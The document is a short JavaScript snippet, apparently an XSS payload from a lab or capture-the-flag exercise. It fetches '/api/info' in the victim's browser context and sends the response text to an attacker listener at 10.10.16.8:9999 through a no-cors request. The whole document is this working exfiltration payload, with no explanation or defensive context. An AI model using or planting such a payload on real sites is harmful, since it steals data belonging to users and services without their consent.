fetch('/api/info').then(response => response.text()).then(text => {
    fetch('http://10.10.16.8:9999/log?' + text, {
        mode: 'no-cors'
    });
});
